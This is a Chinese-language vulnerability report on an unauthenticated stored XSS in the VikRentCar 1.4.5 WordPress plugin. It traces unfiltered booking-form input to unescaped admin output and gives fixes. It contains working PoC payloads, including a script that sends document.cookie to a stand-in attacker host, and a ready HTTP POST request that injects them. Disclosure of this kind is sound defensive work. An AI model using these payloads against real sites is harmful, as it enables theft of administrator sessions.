# 🔴 VikRentCar 1.4.5 - Stored XSS 漏洞报告

---

## 📋 漏洞概述

| 项目 | 详情 |
|-----|------|
| **漏洞类型** | Stored Cross-Site Scripting (存储型跨站脚本) |
| **CVE** | 待分配 |
| **影响版本** | VikRentCar ≤ 1.4.5 |
| **严重程度** | 高危 (CVSS 3.1: 6.1) |
| **利用权限** | 未授权用户 (Unauthenticated) |
| **报告日期** | 2026-03-13 |

---

## 🐛 漏洞详情

### 1. 漏洞描述

 VikRentCar 插件存在存储型 XSS 漏洞，攻击者可通过预订表单的自定义字段注入恶意 JavaScript 代码。当管理员在后台查看订单详情时，恶意代码将自动执行。

### 2. 漏洞位置

#### 🔴 写入点（无输入过滤）

**文件：** `site/controller.php:253`

```php
// 保存用户输入到 custdata 数组，无任何过滤
foreach ($cfields as $cf) {
    if ($cf['type'] != 'separator' && $cf['type'] != 'country' && ( $cf['type'] != 'checkbox' || ($cf['type'] == 'checkbox' && intval($cf['required']) != 1) ) ) {
        // ⚠️ 直接获取用户输入，无过滤
        $arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
        $arrcfields[$cf['id']] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
        $nextorderdata['customfields'][$cf['id']] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
    }
    // ...
}
```

**文件：** `site/controller.php:602`

```php
// 将用户数据存入数据库，无过滤
$custdata = VikRentCar::buildCustData($arrcustdata, "\n");

// SQL 插入
$q = "INSERT INTO `#__vikrentcar_orders` (`custdata`, ...) VALUES(" . $dbo->quote($custdata) . ", ...);";
```

---

#### 🔴 触发点（无输出过滤）

**文件：** `admin/views/editorder/tmpl/default.php:475`

```php
<!-- ⚠️ 直接输出用户数据，无任何过滤 -->
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>
```

**文件：** `admin/views/editorder/tmpl/default.php:479`

```php
<!-- ⚠️ 另一处直接输出 -->
<?php echo nl2br($row['custdata']); ?>
```

**文件：** `site/views/order/tmpl/default.php:219`

```php
<!-- 前台订单详情页面也有相同问题 -->
<span class="vrcvordudatatitle"><?php echo JText::translate('VRPERSDETS'); ?></span> <?php echo nl2br($ord['custdata']); ?>
```

---

### 3. 代码流程图

```
攻击者提交表单
       ↓
site/controller.php (写入点)
  ↓
VikRequest::getString() 获取用户输入
  ↓
无过滤存入数据库 ($custdata)
  ↓
管理员查看订单
  ↓
admin/views/editorder/tmpl/default.php (触发点)
  ↓
nl2br() 输出 → XSS 执行！
```

---

### 4. 受影响数据

- **数据表：** `#__vikrentcar_orders`
- **受影响字段：** `custdata`
- **字段内容示例：**
```
Name: <img src=x onerror=alert(1)>
Email: test@test.com
Phone: 123456
```

---

## ⚔️ 利用方式

### 攻击链

1. **攻击者**（无需登录）访问前台预订页面
2. 在自定义字段（如姓名、电话）中输入 XSS payload
3. 提交预订 → 数据存入数据库
4. **管理员**登录后台查看订单详情
5. XSS 触发，攻击者可窃取管理员 Cookie/Session

### PoC Payload

```html
<!-- 简单测试 -->
<img src=x onerror=alert(document.domain)>

<!-- 窃取 Cookie -->
<script>fetch('https://attacker.com?c='+document.cookie)</script>

<!-- 绕过过滤 -->
<img src=x onerror=alert(1)>
```

### 攻击请求示例

```http
POST /index.php?option=com_vikrentcar&task=saveorder HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 156

car=1&days=1&pickup=1735689600&release=1735776000&prtar=1&place=1&returnplace=1&priceid=1&vrcf2=<img+src=x+onerror=alert(document.cookie)>
```

---

## ✅ 符合赏金条件

| Wordfence 要求 | 状态 |
|---------------|------|
| Stored XSS | ✅ |
| 可被未授权用户利用 | ✅ |
| 安装量 ≥ 500 | ✅ |
| 影响显著 | ✅ |

---

## 🛡️ 修复建议

### 方案 1：输出过滤（推荐）

**文件：** `admin/views/editorder/tmpl/default.php:475`

```php
// 修复前 ⚠️
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>

// 修复后 ✅
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br(esc_html($row['custdata'])); ?></span>
```

**文件：** `site/views/order/tmpl/default.php:219`

```php
// 修复前 ⚠️
<?php echo nl2br($ord['custdata']); ?>

// 修复后 ✅
<?php echo nl2br(esc_html($ord['custdata'])); ?>
```

### 方案 2：输入过滤

**文件：** `site/controller.php:253`

```php
// 修复前 ⚠️
$arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');

// 修复后 ✅
$arrcustdata[JText::translate($cf['name'])] = sanitize_text_field(VikRequest::getString('vrcf' . $cf['id'], '', 'request'));
```

---

## 📊 影响评估

| 维度 | 评估 |
|-----|------|
| **机密性** | 中 - 攻击者可窃取敏感数据 |
| **完整性** | 中 - 可篡改页面内容 |
| **可用性** | 低 - 无直接影响 |
| **攻击复杂度** | 低 - 无需特殊技能 |
| **权限要求** | 无 - 未授权即可利用 |

---

## 📅 时间线

| 日期 | 事件 |
|-----|------|
| 2026-03-13 | 漏洞发现 |
| 2026-03-13 | 报告生成 |
| - | 提交厂商 |
| - | 厂商确认 |
| - | 漏洞修复 |
| - | 公开披露 |

---

## 📎 漏洞代码片段汇总

### 1. 输入点 (site/controller.php)

```php
// Line 253
$arrcustdata[JText::translate($cf['name'])] = VikRequest::getString('vrcf' . $cf['id'], '', 'request');
```

### 2. 存储 (site/controller.php)

```php
// Line 602
$custdata = VikRentCar::buildCustData($arrcustdata, "\n");
// ...
$q = "INSERT INTO `#__vikrentcar_orders` ... VALUES(..., " . $dbo->quote($custdata) . ", ...";
```

### 3. 输出点 (admin/views/editorder/tmpl/default.php)

```php
// Line 475
<span class="vrc-bookingdet-userdetail-val"><?php echo nl2br($row['custdata']); ?></span>

// Line 479
<?php echo nl2br($row['custdata']); ?>
```

---


